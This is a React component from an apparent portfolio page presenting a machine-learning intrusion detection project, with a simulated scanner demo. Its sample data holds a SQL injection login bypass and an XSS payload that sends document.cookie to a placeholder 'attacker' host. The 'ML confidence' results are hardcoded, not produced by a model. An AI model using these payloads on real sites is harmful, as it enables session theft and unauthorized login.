import React, { useState } from 'react';
import { ShieldAlert, ShieldCheck, Github, ExternalLink, Cpu, Terminal, Play, AlertTriangle, Activity } from 'lucide-react';
import { portfolioData } from '../data/portfolioData';

export const FeaturedProject = () => {
  const project = portfolioData.featuredProject;
  
  // Interactive IDS Live Test Simulation State
  const [selectedPayload, setSelectedPayload] = useState('normal');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [scanResult, setScanResult] = useState(null);

  const testPayloads = [
    {
      id: 'normal',
      label: 'Normal HTTP Traffic',
      payload: 'GET /api/v1/products?category=electronics HTTP/1.1',
      status: 'Clean',
      isMalicious: false,
      mlConfidence: '99.4%',
      classification: 'NORMAL_TRAFFIC',
      details: 'Standard web application GET request. No anomalous patterns detected.'
    },
    {
      id: 'sqli',
      label: 'SQL Injection Attack',
      payload: 'POST /login username=admin\' OR 1=1--&password=pass',
      status: 'Malicious',
      isMalicious: true,
      mlConfidence: '98.8%',
      classification: 'SQL_INJECTION',
      details: 'Unsanitized tautology string pattern detected in HTTP body parameter.'
    },
    {
      id: 'xss',
      label: 'Cross-Site Scripting (XSS)',
      payload: 'GET /search?q=<script>document.location="http://attacker/steal="+document.cookie</script>',
      status: 'Malicious',
      isMalicious: true,
      mlConfidence: '97.6%',
      classification: 'XSS_ATTACK',
      details: 'HTML script execution vectors identified in URL parameter payload.'
    }
  ];

  const runModelTest = (payloadItem) => {
    setSelectedPayload(payloadItem.id);
    setIsAnalyzing(true);
    setScanResult(null);

    setTimeout(() => {
      setIsAnalyzing(false);
      setScanResult(payloadItem);
    }, 600);
  };

  return (
    <section id="featured-project" className="py-24 relative border-t border-slate-800/60 bg-[#080d1a]">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* Section Heading */}
        <div className="text-center max-w-3xl mx-auto space-y-3 mb-16">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-950/60 border border-emerald-500/30 text-emerald-400 text-xs font-mono">
            <ShieldAlert className="w-3.5 h-3.5" />
            <span>FEATURED CYBERSECURITY & ML PROJECT</span>
          </div>
          <h2 className="text-3xl sm:text-4xl font-bold text-white tracking-tight">
            Intrusion Detection System (IDS)
          </h2>
          <p className="text-slate-400 text-sm sm:text-base">
            Developing machine learning models to detect and mitigate web application cyber threats.
          </p>
        </div>

        {/* Heroic Featured Project Card */}
        <div className="glass-card rounded-3xl p-6 sm:p-10 border border-cyan-500/30 shadow-2xl relative overflow-hidden">
          
          {/* Background Ambient Glow */}
          <div className="absolute top-0 right-0 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none"></div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 items-center">
            
            {/* Left Info Column */}
            <div className="lg:col-span-7 space-y-6">
              
              <div className="flex flex-wrap items-center gap-2">
                <span className="px-3 py-1 rounded-md bg-cyan-950 border border-cyan-500/40 text-cyan-300 font-mono text-xs font-semibold">
                  PRIMARY FEATURED PROJECT
                </span>
                <span className="px-3 py-1 rounded-md bg-emerald-950 border border-emerald-500/40 text-emerald-300 font-mono text-xs flex items-center gap-1">
                  <Activity className="w-3 h-3" /> Machine Learning IDS
                </span>
              </div>

              <h3 className="text-2xl sm:text-3xl font-extrabold text-white leading-tight">
                {project.title}
              </h3>

              <p className="text-slate-300 text-sm sm:text-base leading-relaxed">
                {project.description}
              </p>

              {/* Key Capabilities */}
              <div className="space-y-3 pt-2">
                <h4 className="text-xs font-mono text-cyan-400 tracking-wider uppercase">Key Capabilities:</h4>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {project.capabilities.map((cap, cIdx) => (
                    <div key={cIdx} className="flex items-start gap-2 text-xs sm:text-sm text-slate-200">
                      <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                      <span>{cap}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Technologies Badges */}
              <div className="pt-2 flex flex-wrap gap-2">
                {project.technologies.map((tech, tIdx) => (
                  <span
                    key={tIdx}
                    className="px-3 py-1 rounded-lg bg-slate-900 border border-slate-800 text-xs font-mono text-slate-300"
                  >
                    {tech}
                  </span>
                ))}
              </div>

              {/* Action Buttons */}
              <div className="pt-4 flex flex-wrap items-center gap-4">
                <a
                  href={project.githubUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-slate-900 border border-slate-700 hover:border-cyan-400 text-slate-100 hover:text-cyan-300 text-sm font-semibold transition-all shadow-md"
                >
                  <Github className="w-4 h-4" />
                  <span>View Code on GitHub</span>
                </a>

                <a
                  href={project.liveDemoUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-cyan-950/60 border border-cyan-500/40 text-cyan-300 hover:bg-cyan-500 hover:text-black text-sm font-semibold transition-all shadow-md shadow-cyan-950/40"
                >
                  <ExternalLink className="w-4 h-4" />
                  <span>Live Project Link</span>
                </a>
              </div>

            </div>

            {/* Right Column: Interactive ML IDS Security Scanner Console */}
            <div className="lg:col-span-5 bg-[#060a14] rounded-2xl border border-slate-800 p-5 space-y-4 shadow-xl">
              
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <div className="flex items-center gap-2 text-xs font-mono text-slate-300">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  <span>Interactive IDS Model Test</span>
                </div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-500/30">
                  ML IDS READY
                </span>
              </div>

              {/* Payload Selector Buttons */}
              <div className="space-y-1.5">
                <p className="text-[11px] text-slate-400 font-mono">Select HTTP Request Vector to Test:</p>
                <div className="grid grid-cols-1 gap-2">
                  {testPayloads.map((item) => (
                    <button
                      key={item.id}
                      onClick={() => runModelTest(item)}
                      className={`w-full text-left px-3 py-2 rounded-lg text-xs font-mono transition-all flex items-center justify-between border ${
                        selectedPayload === item.id
                          ? 'bg-cyan-950/70 border-cyan-400 text-cyan-200'
                          : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:bg-slate-800/80 hover:text-slate-200'
                      }`}
                    >
                      <span className="truncate">{item.label}</span>
                      <Play className="w-3 h-3 text-cyan-400 shrink-0 ml-2" />
                    </button>
                  ))}
                </div>
              </div>

              {/* Analysis Monitor Box */}
              <div className="bg-[#090e1c] rounded-xl p-3.5 border border-slate-800 space-y-2 font-mono text-xs">
                <div className="text-[10px] text-slate-500">INSPECTING HTTP PAYLOAD:</div>
                <div className="p-2 rounded bg-slate-950 border border-slate-800 text-cyan-300 overflow-x-auto text-[11px] whitespace-pre-wrap break-all">
                  {testPayloads.find(p => p.id === selectedPayload)?.payload}
                </div>

                {/* Status Indicator Result */}
                {isAnalyzing ? (
                  <div className="py-3 text-center text-cyan-400 flex items-center justify-center gap-2">
                    <Cpu className="w-4 h-4 animate-spin" />
                    <span>ML Classifier Model Running Analysis...</span>
                  </div>
                ) : scanResult ? (
                  <div className={`p-3 rounded-lg border space-y-1 ${
                    scanResult.isMalicious
                      ? 'bg-rose-950/40 border-rose-500/40 text-rose-300'
                      : 'bg-emerald-950/40 border-emerald-500/40 text-emerald-300'
                  }`}>
                    <div className="flex items-center justify-between font-bold">
                      <span className="flex items-center gap-1.5">
                        {scanResult.isMalicious ? <AlertTriangle className="w-4 h-4" /> : <ShieldCheck className="w-4 h-4" />}
                        {scanResult.classification}
                      </span>
                      <span className="text-[10px] px-2 py-0.5 rounded bg-slate-900 text-slate-200">
                        Conf: {scanResult.mlConfidence}
                      </span>
                    </div>
                    <p className="text-[11px] opacity-90">{scanResult.details}</p>
                  </div>
                ) : null}
              </div>

            </div>

          </div>

        </div>

      </div>
    </section>
  );
};
